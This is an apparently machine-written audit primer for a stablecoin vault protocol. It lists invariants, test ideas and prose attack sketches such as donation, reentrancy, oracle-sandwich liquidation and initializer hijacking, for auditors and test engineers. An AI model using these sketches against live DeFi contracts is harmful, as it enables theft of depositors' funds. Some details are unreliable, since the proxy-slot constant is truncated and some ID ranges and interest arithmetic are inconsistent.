# Monolith Stablecoin Attacker Primer — v1.0

**Date:** December 6, 2025  
**Author:** Automated Researcher  
**Scope:** Over-collateralized stablecoin factory + interest-bearing vaults + autonomous rate controllers + multi-collateral support  
**Audience:** Senior Auditors, Test Engineers, Exploit Researchers  
**Threat Model:** Deployer-as-attacker, oracle manipulation, factory state leakage, interest accrual races, permission boundary breaches  

---

## Conventions & Naming

### Pattern IDs (PR-XXX)
- **Format:** `PR-{CATEGORY}-{NUMBER}` (e.g., `PR-FAC-001`, `PR-VAULT-020`, `PR-INT-030`)
- **Categories:**
  - `FAC` = Factory/Deployment (001–050)
  - `VAULT` = Vault accounting/shares (051–100)
  - `INT` = Interest rate controller (101–150)
  - `ORACLE` = Price feeds/staleness (151–200)
  - `PERM` = Permissions/access control (201–250)
  - `REENT` = Reentrancy/CEI (251–300)
  - `TOKEN` = ERC20 quirks (301–350)

### Invariant IDs (INV-XXX)
- **Format:** `INV-{NUMBER}` (e.g., `INV-001`, `INV-042`)
- **Range:** INV-001 through INV-050
- **Structure:** `INV-NNN - Title: formal_expression // why attacker cares`

### Test IDs (TST-XXX)
- **Format:** `TST-{TYPE}-{NUMBER}` (e.g., `TST-UNIT-005`, `TST-FUZZ-012`, `TST-SIM-003`)
- **Types:** UNIT, FUZZ, SIM, PROP, REPLAY

### Exploit Templates (EXP-XXX)
- **Format:** `EXP-{NUMBER}` (e.g., `EXP-001`)
- **Pattern:** Title → Preconditions → [TX1, TX2, ...] → Post-state validation

### Code Reference Style
- **File + line range:** `contracts/Vault.sol:127-135`
- **Function:** `Vault.sol::_accrueInterest()`
- **State var:** `Vault.sol::totalShares`

---

## Quick Executive Attack Map

1. **Factory Initialization Bypass** (`PR-FAC-001`)
   - Deployer can initialize with crafted params (zero fee, infinite LTV) → post-deploy param mutation impossible
   - Risk: Permanent stablecoin with no fee revenue or risk control
   - Impact: 5/5

2. **Oracle Staleness + Liquidation Race** (`PR-ORACLE-001`)
   - TWAP window configured at deployment; attacker sandwich-trades prior block, liquidates on stale oracle
   - Risk: False liquidations of healthy positions, collateral theft
   - Impact: 5/5

3. **Interest Accrual Reentrancy** (`PR-REENT-001`)
   - External call in `_accrueInterest()` before state update; attacker reenters to withdraw inflated balance
   - Risk: Drain of vault reserve, share price collapse
   - Impact: 5/5

4. **Share Price Donation (First Depositor)** (`PR-VAULT-001`)
   - First depositor's share price can be inflated via direct token transfer; subsequent depositors lose precision
   - Risk: Theft of subsequent deposits via rounding
   - Impact: 4/5

5. **Factory Parameter Counterfactual Prediction** (`PR-FAC-005`)
   - Factory uses CREATE2; attacker pre-calculates vault address, deposits before official deployment
   - Risk: Griefing, front-running, forced vault state pollution
   - Impact: 4/5

6. **Collateral Decimals Mismatch** (`PR-VAULT-005`)
   - Vault assumes 18-decimals but accepts 6-decimal USDC; LTV calculations fail by 12 orders of magnitude
   - Risk: Over-leverage, insolvency
   - Impact: 5/5

7. **Permit Replay + Chain ID Omission** (`PR-PERM-001`)
   - Permit signature does not bind to chainId; attacker replays across fork
   - Risk: Unauthorized spend on bridged vaults
   - Impact: 4/5

8. **Malicious Deployer Fee Minting** (`PR-FEE-001`)
   - Deployer address hardcoded as fee receiver; can mint unlimited shares to itself post-deployment
   - Risk: Dilution of all depositors, protocol insolvency
   - Impact: 5/5

9. **TWAP Manipulation via Flash Loan** (`PR-ORACLE-005`)
   - Interest rate controller uses short-window TWAP (e.g., 15 blocks); attacker flash-loans massive collateral to spike price
   - Risk: Liquidations triggered, interest rate spikes
   - Impact: 4/5

10. **Proxy Upgrade Storage Collision** (`PR-FAC-010`)
    - Vault proxy layout does not reserve slots for controller upgrades; upgrading breaks share price calculation
    - Risk: Complete vault compromise
    - Impact: 5/5

---

## Critical Invariants (INV-001 … INV-050)

### Fund Conservation & Accounting

**INV-001 - Total Supply Conservation**
```
totalAssets() >= sum(collateralBalance[i] for all i) - totalDebt()
```
*Test:* Fuzz deposit/withdraw; snapshot `totalAssets` pre/post; assert monotonicity  
*Attacker care:* Leak in collateral accounting enables overdraft liquidation or reserve drain

**INV-002 - Share Price Monotonicity**
```
sharePrice(t) >= sharePrice(t-1) // post-deployment
```
*Test:* Block-by-block oracle mock advance; measure `totalAssets / totalShares`  
*Attacker care:* Price drop enables re-deposit attacks, deflation tricks

**INV-003 - Redeemable Assets Upper Bound**
```
redeemableAssets <= totalAssets() - minReserveRatio * totalDebt()
```
*Test:* Fuzz redeem calls; check reserve is never below threshold  
*Attacker care:* Over-redemption causes insolvency; under-redemption indicates fee leakage

**INV-004 - Interest Accrual Lower Bound**
```
accruedInterest(t) >= accruedInterest(t-1)
```
*Test:* Advance blocks; measure accumulated fees  
*Attacker care:* Reverting interest suggests missing-accrual window (exploitable rate arb)

**INV-005 - Debt Repayment Completeness**
```
totalBorrowable() == sum(availableCollateral[i] / LTV[i] for all i)
```
*Test:* Mock price feed; fuzz deposits; validate borrow limits  
*Attacker care:* Broken LTV = over-collateral mispricing = liquidation sandwich

### Share Accounting

**INV-006 - Share Mint/Burn Balance**
```
totalShares(after_mint) == totalShares(before) + mintedShares
totalShares(after_burn) == totalShares(before) - burnedShares
```
*Test:* Unit test on Vault::_mint/_burn  
*Attacker care:* Share supply inflation is the slowest path to insolvency; track cumulative share issuance

**INV-007 - Share Price Precision (No Rounding to Zero)**
```
// For deposit of 1 wei:
assert( (depositAmount * 1e18 / sharePrice) > 0 || depositAmount == 0 )
```
*Test:* TST-UNIT-001: deposit 1 wei collateral; measure minimum share issuance  
*Attacker care:* Donation + rounding-to-zero = free griefing of small deposits

**INV-008 - Exchange Rate Inversion Detection**
```
// Must NOT be true:
assert( sharePrice < 1e6 ) // if price inverted (e.g., token/share instead of share/token)
```
*Test:* TST-FUZZ-002: properties over sharePrice  
*Attacker care:* Inverted math = total valuation flip

### Interest Rate Controller

**INV-009 - Interest Rate Bounded**
```
minRate <= currentRate <= maxRate // as configured at deployment
```
*Test:* TST-PROP-001: invariant checker over rate updates  
*Attacker care:* Unbounded rate = liquidation cascade or zero-rate (fee theft)

**INV-010 - Interest Accrual Timestamp Monotonicity**
```
lastAccrualTimestamp(t) >= lastAccrualTimestamp(t-1)
```
*Test:* TST-UNIT-002: block.timestamp mocking  
*Attacker care:* Backwards time = interest reversal (attacker drains fees)

**INV-011 - Per-Block vs Per-Second Consistency**
```
// If rate controller uses both:
assert( ratePerBlock * BLOCKS_PER_YEAR == ratePerSecond * SECONDS_PER_YEAR )
```
*Test:* TST-UNIT-003: cross-check rate unit conversion  
*Attacker care:* Unit mismatch = liquidation margin miscalculation (4x variance possible)

**INV-012 - Accrual Monotonicity Post-External-Call**
```
// Struct accrual state must be updated AFTER all external calls complete
```
*Test:* TST-REENT-001: reentrancy harness with callback state snapshot  
*Attacker care:* Accrual before external call = attacker sees stale balance, reenter for arbitrage

### Liquidation & Health Factor

**INV-013 - Health Factor Repay Threshold**
```
healthFactor(account) >= 1.0 IFF account is not liquidatable
healthFactor(account) = totalCollateralValue / totalBorrowValue * 100
```
*Test:* TST-FUZZ-003: fuzz prices, deposits, borrows; check liquidation invariant  
*Attacker care:* Off-by-one in HF threshold = self-liquidation via oracle update

**INV-014 - Liquidation Reward Non-Negative**
```
liquidationReward >= 0
liquidationReward <= seizedCollateral * (1.0 + maxLiquidationFee)
```
*Test:* TST-UNIT-004: liquidate at boundary HF; measure seized vs repaid  
*Attacker care:* Negative reward = attacker pays to liquidate (fund recovery vector)

**INV-015 - Liquidation Price Protection**
```
// Liquidation must use reasonably recent oracle price, not stale
assert( (block.timestamp - oracleLastUpdate) < ORACLE_MAX_AGE )
```
*Test:* TST-SIM-001: advance time > max age; attempt liquidation  
*Attacker care:* Stale liquidation = flash-loan sandwich + forced liquidation

### Collateral & Reserve

**INV-016 - Collateral Balance Tracking**
```
ERC20(collateral).balanceOf(vault) >= totalCollateral - dustThreshold
```
*Test:* TST-UNIT-005: deposit/withdraw/liquidate; compare contract balance vs state  
*Attacker care:* Ledger/balance mismatch = withdrawal failure or double-counting

**INV-017 - Reserve Adequacy**
```
vaultReserve >= totalBorrow * minReserveRatio
```
*Test:* TST-FUZZ-004: fuzz deposits/borrows; snapshot reserves  
*Attacker care:* Under-reserved vault = run-on-bank via mass withdrawals

**INV-018 - Collateral Decimals Invariant**
```
// All collateral handling must normalize to 18-decimal basis:
assert( normalizedAmount == rawAmount * 10^(18 - tokenDecimals) )
```
*Test:* TST-UNIT-006: test with USDC (6-dec), USDT (6-dec), WETH (18-dec); measure precision  
*Attacker care:* Decimal mismatch = LTV breakdown

### Oracle & Price Feeds

**INV-019 - Oracle Freshness Binding**
```
// If lastUpdate used, must be <= block.timestamp and >= block.timestamp - MAX_AGE
assert( block.timestamp >= oracleTimestamp )
assert( block.timestamp - oracleTimestamp <= MAX_ORACLE_AGE )
```
*Test:* TST-SIM-002: advance block.timestamp past MAX_AGE; attempt price fetch  
*Attacker care:* Stale oracle = sandwich liquidation or rate manipulation

**INV-020 - Price Feed Inversion Detection**
```
// Price must be > 0 and < reasonable_max (e.g., 1e30 for 18-dec)
assert( price > 0 && price < 1e30 )
```
*Test:* TST-UNIT-007: mock inverted prices (1/x); measure LTV effects  
*Attacker care:* Inverted price = total insolvency

**INV-021 - TWAP Window Sufficiency**
```
// TWAP must span enough blocks to resist manipulation
assert( TWAP_WINDOW_BLOCKS >= MIN_TWAP_WINDOW )
```
*Test:* TST-SIM-003: flash-loan attack within TWAP window  
*Attacker care:* Short window = price spikeable, liquidation/interest rate controlled

**INV-022 - Multi-Price Consistency (Collaterals)**
```
// Prices fetched in same tx should not have timing gaps
assert( priceTimestamp[token1] approx priceTimestamp[token2] )
```
*Test:* TST-UNIT-008: stagger oracle updates; measure price age delta  
*Attacker care:* Timing gap = sandwich deposit via cross-collateral arbitrage

### Fee Accounting

**INV-023 - Fee Accumulation Monotonicity**
```
totalFeesAccrued(t) >= totalFeesAccrued(t-1)
```
*Test:* TST-FUZZ-005: advance blocks, measure fee growth  
*Attacker care:* Negative fees = attacker extraction point

**INV-024 - Fee Minting Balance**
```
feesOwedToProtocol == totalSupply(feeToken) - sum(user balances)
```
*Test:* TST-UNIT-009: compare fee ledger vs share supply surplus  
*Attacker care:* Unaccounted fees = dilution vector

**INV-025 - Fee Cap Enforcement**
```
deployerFeeRate + interestFeeRate + liquidationFeeRate <= MAX_TOTAL_FEE
```
*Test:* TST-UNIT-010: assert fee sum at deployment validation  
*Attacker care:* Fee overflow = protocol insolvency (100%+ fees possible)

### Permission & Access Control

**INV-026 - Deployer Immutability**
```
// After deployment, factory cannot be re-initialized
assert( deployerAddress == IMMUTABLE_DEPLOYER && cannotChange() )
```
*Test:* TST-UNIT-011: attempt re-init after deployment  
*Attacker care:* Mutable deployer = parameter hijack (factory malleability)

**INV-027 - Vault Immutability Post-Deployment**
```
assert( vaultImpl == expectedImpl && collateral == expectedCollateral )
```
*Test:* TST-UNIT-012: snapshot vault state at deployment; verify no mutations  
*Attacker care:* Mutable vault = collateral/rate swap, stablecoin loses backing

**INV-028 - Mint Permission Boundary**
```
// Only vault contract can mint stablecoin shares
assert( msg.sender == vault || msg.sender == FACTORY ) for mint()
```
*Test:* TST-UNIT-013: attempt mint from EOA; should revert  
*Attacker care:* Mint permission breach = free share inflation

### Miscellaneous

**INV-029 - Total Borrowed <= Total Borrowable**
```
totalBorrow <= totalBorrowable()
```
*Test:* TST-FUZZ-006: fuzz borrow calls; snapshot cumulative  
*Attacker care:* Over-borrow = insolvency

**INV-030 - No Circular Collateral Dependencies**
```
// Stablecoin cannot use itself as collateral (base case)
assert( collateral != stablecoin )
```
*Test:* TST-UNIT-014: config validation  
*Attacker care:* Circular = share price hyperinflation via recursion

**INV-031 - Permit Nonce Increment**
```
permitNonce[user]++ must occur exactly once per successful permit()
```
*Test:* TST-UNIT-015: replay same permit twice; second must fail  
*Attacker care:* Nonce reuse = unlimited spend

**INV-032 - Withdrawal Liquidity Check**
```
// Vault must have sufficient reserve to honor withdrawal
assert( collateralBalance >= withdrawalAmount )
```
*Test:* TST-UNIT-016: drain reserve via interest update, then attempt max redeem  
*Attacker care:* Illiquid vault = withdrawal DOS

**INV-033 - Reentrancy Guard Protection**
```
// All state mutations must complete before external calls
// OR reentrancy guard active during external calls
```
*Test:* TST-REENT-002: test suite with ERC777 callback injection  
*Attacker care:* Unguarded external call = balance doubling

**INV-034 - Interest Rate Smoothing**
```
// Rate changes should not exceed maxRateChangePerBlock
assert( |currentRate - previousRate| <= maxRateChange )
```
*Test:* TST-PROP-002: rate update sequence checker  
*Attacker care:* Rate spike = liquidation cascade

**INV-035 - Collateral Liquidation Completeness**
```
// After liquidation, seized collateral must be fully transferred
assert( seizedAmount == calculatedAmount )
```
*Test:* TST-UNIT-017: liquidate boundary cases; verify transfer  
*Attacker care:* Incomplete liquidation = bad debt accumulation

**INV-036 - Share Price >= 1e18 (Or Consistent Scaling)**
```
// Share price should not drift far below 1.0 due to rounding
assert( sharePrice >= 0.999e18 )
```
*Test:* TST-FUZZ-007: long-running deposit/withdrawal fuzz  
*Attacker care:* Share price < 1.0 = rounding loss accumulation (inflation vector)

**INV-037 - Borrow Limit Per User**
```
// Optional: per-user borrow cap
assert( userBorrow <= userBorrowCap )
```
*Test:* TST-UNIT-018: max-out user borrow; add 1 wei; should revert  
*Attacker care:* Uncapped borrow = concentration risk

**INV-038 - Collateral Price Reasonability Bounds**
```
// Price should be within realistic range (e.g., USD-pegged between 0.5–1.5)
assert( 0.5e18 <= stablecoinPrice <= 1.5e18 )
```
*Test:* TST-PROP-003: oracle mock property  
*Attacker care:* Unrealistic price = oracle compromise detection

**INV-039 - Proxy Storage Layout Invariant**
```
// Proxy upgrade must preserve critical state var slots
// Slot 0: implementation, Slot 1+: user data (no collision)
```
*Test:* TST-UNIT-019: snapshot storage pre/post upgrade; compare key slots  
*Attacker care:* Storage collision = state mutation via upgrade

**INV-040 - Factory CREATE2 Salt Consistency**
```
// Salt must be deterministic and immutable post-deployment
assert( salt == keccak256(abi.encode(params)) )
```
*Test:* TST-UNIT-020: deploy two vaults with same params; compare addresses  
*Attacker care:* Non-deterministic salt = counterfactual address prediction failure

**INV-041 - Underlying Token Balance Integrity**
```
// For ERC20Fee or deflationary tokens:
balanceAfterTransfer >= expectedBalance - feesApplied
```
*Test:* TST-UNIT-021: test with FeeOnTransfer mock  
*Attacker care:* Fee-on-transfer unaccounted = reserve drain

**INV-042 - Interest Accrual Snapshot Consistency**
```
// accrualSnapshot.rate must not change within same block
assert( accrualSnapshot.rate == accrualSnapshot.rateAtSnapshot )
```
*Test:* TST-UNIT-022: simulate multi-call within same block  
*Attacker care:* Rate change mid-block = inconsistent interest calculation

**INV-043 - Liquidation Oracle Price Binding**
```
// Liquidation must use oracle price from liquidation block, not earlier
assert( liquidationPrice == getPrice() ) // measured at tx time
```
*Test:* TST-SIM-004: sandwich liquidation between price updates  
*Attacker care:* Stale liquidation price = front-run liquidation rewards

**INV-044 - No Dust Accumulation in Rounding**
```
// Sum of individual conversions should approximately equal bulk conversion
assert( sumOfIndividualShares approx bulkShare ± dustThreshold )
```
*Test:* TST-FUZZ-008: many small deposits vs one large  
*Attacker care:* Rounding leak = slow reserve drainage

**INV-045 - Share Transfer Restriction (If Non-Transferable)**
```
// If shares are non-transferable:
assert( transfer() reverts || transferFrom() reverts )
```
*Test:* TST-UNIT-023: attempt transfer between users  
*Attacker care:* Transferable shares = secondary market arbitrage, potential for fractional liquidation

**INV-046 - Collateral Seize Atomicity**
```
// Seize operation must be all-or-nothing (no partial transfer failure)
```
*Test:* TST-UNIT-024: mock ERC20 transfer fail mid-liquidation  
*Attacker care:* Partial seize = liquidation state inconsistency

**INV-047 - Rate Update Authorization**
```
// Only authorized keeper/owner can trigger rate updates
assert( msg.sender == authorizedKeeper || msg.sender == owner )
```
*Test:* TST-UNIT-025: attempt rate update from EOA  
*Attacker care:* Unauthorized rate = interest arb by attacker

**INV-048 - Oracle Fallback Chain Completeness**
```
// If primary oracle fails, fallback must be functional (or revert cleanly)
assert( price != 0 || fallback != 0 || revert )
```
*Test:* TST-UNIT-026: disable primary oracle; measure fallback activation  
*Attacker care:* Broken fallback = liquidation DOS

**INV-049 - Borrow Rate Accrual vs Deposit Rate Accrual**
```
// Both sides of the interest curve must accrue consistently
assert( borrowerInterest + depositorInterest == totalInterestGenerated )
```
*Test:* TST-FUZZ-009: monitor both accrual streams  
*Attacker care:* Interest mismatch = fee leakage or depositor loss

**INV-050 - Upgrade Proxy Pattern Consistency**
```
// If using UUPS, delegatecall must land in authorized implementation slot
assert( _implementation == authorizedImpl )
```
*Test:* TST-UNIT-027: attempt unauthorized upgrade; should revert  
*Attacker care:* Broken upgrade guard = arbitrary code execution

---

## Vulnerability Taxonomy (PR-001 … PR-150)

### Factory & Deployment (PR-FAC-001 … PR-FAC-050)

**PR-FAC-001 - Unprotected Initializer**
- **Pattern:** Factory `initialize()` called without reentrancy guard or access check; can be called twice with different params
- **Root cause:** Missing `onlyOnce` modifier or initializer status check
- **Attack sketch:**
  1. Attacker calls `initialize(0, 0, attacker)` after legitimate init
  2. Fee receiver becomes attacker; LTV becomes 0
  3. All future stablecoins inherit malicious params
- **Priority:** 5/5

**PR-FAC-002 - CREATE2 Salt Predictability**
- **Pattern:** Vault address derived from deterministic params without deployer-specific randomness
- **Root cause:** Salt = `keccak256(collateral, params)` instead of `keccak256(deployer, collateral, params, nonce)`
- **Attack sketch:**
  1. Attacker predicts vault address for known params
  2. Deposits to counterfactual address before official deployment
  3. On deployment, attacker's balance is recognized; front-runs share distribution
- **Priority:** 4/5

**PR-FAC-003 - Missing Vault Initialization Check**
- **Pattern:** Factory deploys proxy but does not enforce proxy `initialize()` call, leaving vault uninitialized
- **Root cause:** Two-step deployment (CREATE + init) without atomicity check
- **Attack sketch:**
  1. Attacker deploys vault proxy
  2. Leaves vault in uninitialized state; shares are not issued
  3. Calls `deposit()` directly on uninitialized implementation; accounting breaks
- **Priority:** 4/5

**PR-FAC-004 - Collateral Decimals Parameter Injection**
- **Pattern:** Factory constructor accepts `collateralDecimals` parameter without validation against actual token
- **Root cause:** No call to `token.decimals()` to verify
- **Attack sketch:**
  1. Factory initialized with `collateralDecimals = 18` for USDC (actually 6)
  2. Deposit 1 USDC (raw: 10^6); accounting interprets as 10^24 worth
  3. LTV threshold surpassed; attacker borrows/liquidates
- **Priority:** 5/5

**PR-FAC-005 - Fee Receiver Immutability Bypass**
- **Pattern:** Fee receiver address baked into vault at deployment; cannot be changed, but can be set to attacker
- **Root cause:** Factory accepts `feeReceiver` param without governance check
- **Attack sketch:**
  1. Attacker deploys vault via factory, specifies attacker as fee receiver
  2. All interest accruals flow to attacker indefinitely
  3. Effective attack on protocol revenue, not user funds (but reputational damage)
- **Priority:** 4/5

**PR-FAC-006 - Implementation Contract Not Initialized**
- **Pattern:** Vault implementation contract deployed with uninitialized state; attacker calls `initialize()` on impl directly
- **Root cause:** Implementation not initialized with dummy data (e.g., `disableInitializers()` in Solidity 0.8.20)
- **Attack sketch:**
  1. Attacker calls `VaultImpl.initialize()` with malicious params
  2. If proxy later delegates to impl, state is already poisoned
  3. Proxy user interactions hit compromised logic
- **Priority:** 5/5

**PR-FAC-007 - LTV Parameter Out-of-Bounds**
- **Pattern:** Factory accepts LTV > 100% (e.g., 150%) without sanity check
- **Root cause:** Missing require statement on LTV input
- **Attack sketch:**
  1. Factory init with `LTV = 150%`
  2. Attacker deposits $100 collateral, borrows $150
  3. Price drops 10%; attacker should be liquidatable but LTV check passes (150% / 110% = 136% > 1)
- **Priority:** 5/5

**PR-FAC-008 - Factory State Mutation After Deployment**
- **Pattern:** Factory stores mutable state (e.g., `feesCollected`) that can be reset or overflowed
- **Root cause:** Public/unprotected state var
- **Attack sketch:**
  1. Attacker calls `factory.resetFees()` (if exposed)
  2. Protocol loses ability to track revenue
- **Priority:** 3/5 (depends on design)

**PR-FAC-009 - Proxy Implementation Slot Clash**
- **Pattern:** Vault proxy uses standard ERC1967 slot (`0x360894a13ba1a3210667c828492db98dca3e2848` for impl) but custom upgrade logic overwrites it
- **Root cause:** Multiple proxies writing to same slot
- **Attack sketch:**
  1. Attacker upgrades proxy to different impl
  2. State is corrupted (shares point to wrong impl)
- **Priority:** 4/5

**PR-FAC-010 - Missing Immutability for Core Parameters**
- **Pattern:** Collateral address, stablecoin address, or interest controller address can be changed post-deployment
- **Root cause:** Setter function with insufficient access control (e.g., `onlyOwner` but owner is upgradeable)
- **Attack sketch:**
  1. Attacker calls `setCollateral(maliciousToken)`
  2. Vault now accepts arbitrary token; previous collateral is orphaned
  3. Share price collapses
- **Priority:** 5/5

### Vault Accounting (PR-VAULT-001 … PR-VAULT-050)

**PR-VAULT-001 - Share Donation / First-Depositor Attack**
- **Pattern:** First depositor mint shares = 1; attacker transfers 1000 tokens directly; second depositor's shares round to 0
- **Root cause:** Share price `= totalAssets / totalShares`; can be inflated by direct transfer
- **Attack sketch:**
  1. Attacker deposits 1 wei; receives 1 share (share price = 1e18)
  2. Attacker transfers 1000 tokens directly to vault
  3. Share price now = 1000e18; next depositor of 1000 tokens gets 0 shares (rounding)
  4. Attacker redeems 1 share for all tokens
- **Priority:** 5/5

**PR-VAULT-002 - Rounding-to-Zero on Share Mint**
- **Pattern:** `sharesToMint = depositAmount * totalShares / totalAssets` can round to 0 if depositAmount is small
- **Root cause:** Integer division without rounding-up or precision checks
- **Attack sketch:**
  1. Attacker inflates share price to 1000e18 (via donation)
  2. User deposits 100 wei; 100 * 1 / 1000e18 = 0 (rounded down)
  3. Attacker redeems all shares for full balance; user gets 0
- **Priority:** 5/5

**PR-VAULT-003 - Total Assets Manipulation via Rebase Token**
- **Pattern:** Vault holds rebase token (e.g., stETH, AAVE); balance increases automatically; accounting does not re-normalize
- **Root cause:** `totalAssets()` cached at deposit time; rebase not re-measured
- **Attack sketch:**
  1. Vault holds stETH; next rebase increases balance by 5%
  2. `totalAssets()` still reports old value
  3. Attacker withdraws at inflated share price
  4. Other users' withdrawals fail (insufficient balance)
- **Priority:** 4/5

**PR-VAULT-004 - Collateral Balance != State Balance**
- **Pattern:** Vault state tracks `totalCollateral = X` but contract balance = `X + fee / X - dust`
- **Root cause:** Fee-on-transfer token not fully accounted; dust from liquidations
- **Attack sketch:**
  1. Deposit 1000 USDT (fee-on-transfer: 0.1% burn)
  2. Vault receives 999.9; state records 1000
  3. Attacker withdraws 1000; contract reverts (insufficient balance)
- **Priority:** 4/5

**PR-VAULT-005 - Share Price Precision Loss Accumulation**
- **Pattern:** Each deposit/withdraw loses 1-2 wei to rounding; after 1000 ops, users have lost 0.001–0.002% (concentrated on attacker via repeated microtxs)
- **Root cause:** Rounding always favors vault (round down on mint, round up on burn)
- **Attack sketch:**
  1. Attacker makes 10000 micro deposits (dust amounts)
  2. Each loses 1-2 wei; cumulative loss = ~10 tokens
  3. Attacker front-runs final withdrawal to capture lost shares
- **Priority:** 3/5

**PR-VAULT-006 - Share Mint Before State Update (CEI Violation)**
- **Pattern:** Vault mints shares to user, then calls external function (e.g., oracle update), then records in state
- **Root cause:** `_mint()` before updating `totalAssets` storage var
- **Attack sketch:**
  1. Attacker receives shares; attacker sees new balance
  2. During oracle update external call, attacker reenters
  3. Attacker withdraws shares at old balance rate
  4. Original transaction completes; share price now lower; attacker extracted value
- **Priority:** 5/5

**PR-VAULT-007 - Inverted Decimal Conversion**
- **Pattern:** `normalizedAmount = amount / 10^(18 - decimals)` instead of `amount * 10^(18 - decimals)`
- **Root cause:** Division instead of multiplication in decimals adjustment
- **Attack sketch:**
  1. Deposit 1 USDC (6 decimals, raw: 1e6)
  2. Normalized to 1e6 / 10^12 = 0 (rounded down)
  3. Attacker deposits 0 effective; state records 0; share price undefined
- **Priority:** 5/5

**PR-VAULT-008 - Flash Loan Mint/Burn**
- **Pattern:** `_mint()` does not check that caller is vault; attacker flash-loans and calls mint directly
- **Root cause:** Missing access control on internal function (should be private)
- **Attack sketch:**
  1. Attacker flashloans stablecoin from external DEX
  2. Calls vault `mint()` with flashloaned amount
  3. Vault mints shares to attacker; shares represent phantom collateral
  4. Attacker redeems shares; disappears with profit
- **Priority:** 5/5

**PR-VAULT-009 - Interest Applied to Wrong Collateral Type**
- **Pattern:** Vault supports multiple collaterals but interest accrual uses global rate; rates should vary by collateral type
- **Root cause:** Single `interestRate` var instead of per-collateral `interestRate[collateral]`
- **Attack sketch:**
  1. Vault has USDC (low-risk) and volatile altcoin (high-risk)
  2. Both accrue same rate; altcoin depositors subsidize USDC
  3. Attacker deposits altcoin, generates zero interest, redeems at inflated share price
- **Priority:** 3/5

**PR-VAULT-010 - Total Assets Caching Without Refresh**
- **Pattern:** `totalAssets()` cached at block boundary; not refreshed within same block
- **Root cause:** Missing `recalculate()` call in multi-call sequences
- **Attack sketch:**
  1. Block N: attacker deposits 1000, receives shares (totalAssets = 1000)
  2. Within same block: external interest accrual adds 100
  3. Attacker calls `totalAssets()`; returns 1000 (stale)
  4. Attacker redeems at stale price (1000 shares → 1000 collateral instead of 1100)
- **Priority:** 4/5

### Interest Rate Controller (PR-INT-001 … PR-INT-050)

**PR-INT-001 - TWAP Window Too Short**
- **Pattern:** TWAP lookback = 15 blocks (~3 min on Ethereum); attacker flash-loans to spike price
- **Root cause:** Deployment param set to insufficient window (should be 1+ hours)
- **Attack sketch:**
  1. Attacker flash-loans 10M USDC, deposits into vault (spiking collateral price temporarily)
  2. Within 15 blocks, TWAP window captures spike
  3. Interest rate controller reads spike; increases rates
  4. Existing borrows now undercollateralized; liquidations cascade
- **Priority:** 5/5

**PR-INT-002 - Interest Rate Manipulation via Collateral Price Feed**
- **Pattern:** Interest controller reads collateral price from oracle; attacker sandwiches price update to manipulate rate
- **Root cause:** Rate calculation uses current oracle price instead of time-averaged
- **Attack sketch:**
  1. Attacker sandwich transaction: (1) buy tokens on DEX to spike price, (2) trigger interest rate update, (3) sell tokens
  2. Interest rate spikes during sandwich; liquidations triggered
  3. Attacker provides liquidity for liquidations
- **Priority:** 4/5

**PR-INT-003 - Accrual Timestamp Overflow**
- **Pattern:** `lastAccrualTime` stored as uint32; overflows in year 2106
- **Root cause:** Insufficient bit width for timestamp
- **Attack sketch:**
  1. In year 2106+, `lastAccrualTime` wraps to 0
  2. Next accrual calculates rate over (current - 0) = huge block range
  3. Interest accrual goes exponential
- **Priority:** 2/5 (long-term)

**PR-INT-004 - Accrual Per-Block vs Per-Second Mismatch**
- **Pattern:** Rate stored as per-block (e.g., 0.001% per block); calculation treats it as per-second
- **Root cause:** Unit confusion in accrual formula
- **Attack sketch:**
  1. Rate = 0.1% per block (legitimate for 12-sec blocks)
  2. Calculation: `newDebt = oldDebt * (1 + 0.001)^(block_range)` where rate meant per-second
  3. Actual rate = (0.001)^(4800 blocks per day) = hyperinflation
- **Priority:** 5/5

**PR-INT-005 - Interest Accrual Before External Call (Reentrancy)**
- **Pattern:** `_accrueInterest()` updates state, then calls external contract (e.g., oracle update), then applies interest
- **Root cause:** CEI violation in accrual function
- **Attack sketch:**
  1. Attacker deposits 1000 collateral; balance = 1000
  2. During accrual, external oracle call made
  3. Attacker reenters via ERC777 callback; withdraws at stale balance (1000 instead of accrued amount)
  4. After reentry, accrual completes; share price now inflated
- **Priority:** 5/5

**PR-INT-006 - Global Accrual vs Individual Position Rate**
- **Pattern:** Controller accrues interest globally every block; individual positions may miss accrual if not touched
- **Root cause:** Missing view-time accrual calculation
- **Attack sketch:**
  1. Position A created at block 100; Position B at block 200
  2. Attacker doesn't touch either position
  3. At block 1000, attacker queries Position B (should have accrued 800 blocks of interest)
  4. State only shows accrual up to last global call; missing 800 blocks on Position B
  5. Attacker redeems at lower-than-true share price
- **Priority:** 4/5

**PR-INT-007 - Rate Update Race with Liquidation**
- **Pattern:** Interest rate controller updates rate; liquidation check uses new rate; liquidation executor uses old rate in same tx
- **Root cause:** No snapshotting of rate at tx start
- **Attack sketch:**
  1. TX: (1) rate update → health factor changes, (2) liquidation call using old HF
  2. Liquidation math is inconsistent; seize amount differs from expected
- **Priority:** 3/5

**PR-INT-008 - Keeper Replay Attack (Rate Update Signature)**
- **Pattern:** Keeper signs rate update; attacker replays signature on different chain/fork
- **Root cause:** Missing chainId binding in keeper signature
- **Attack sketch:**
  1. On mainnet, keeper signs rate update (rate 5%)
  2. Chain is forked; attacker replays signature on fork testnet
  3. Testnet vault now has mainnet rate; liquidations occur at wrong HF
- **Priority:** 3/5 (depends on keeper model)

**PR-INT-009 - Exponential Overflow in Interest Calculation**
- **Pattern:** `debt * (1 + rate)^n` calculation overflows if n is large (missing safe math)
- **Root cause:** Naive exponentiation without overflow checks
- **Attack sketch:**
  1. Rate = 1% per block (reasonable)
  2. No accrual for 1000 blocks
  3. Next accrual: `1 * (1.01)^1000` overflows; wraps to negative debt
- **Priority:** 4/5

**PR-INT-010 - Fixed-Point Math Precision Loss**
- **Pattern:** Interest rate stored as fixed-point (e.g., 1e6 per block); calculation loses precision over many blocks
- **Root cause:** Non-64-bit multiplication in accrual
- **Attack sketch:**
  1. Rate = 1.23e6 (fixed-point precision)
  2. Over 100000 blocks: precision loss accumulates to 0.1% error
  3. Attacker exploits error by precise withdrawal/deposit timing
- **Priority:** 3/5

### Oracle & Price Feeds (PR-ORACLE-001 … PR-ORACLE-050)

**PR-ORACLE-001 - Stale Oracle Price Used for Liquidation**
- **Pattern:** Vault uses oracle price with `lastUpdate > MAX_AGE` for liquidation health check
- **Root cause:** Missing freshness check in liquidation function
- **Attack sketch:**
  1. Oracle last updated 2 hours ago (max age = 1 hour); price = $100
  2. Price drops to $50; oracle not updated yet
  3. Attacker sandwiches new oracle update: (1) triggers liquidation on stale $100 price, (2) price updates to $50, (3) attacker gets collateral at $100 effective price
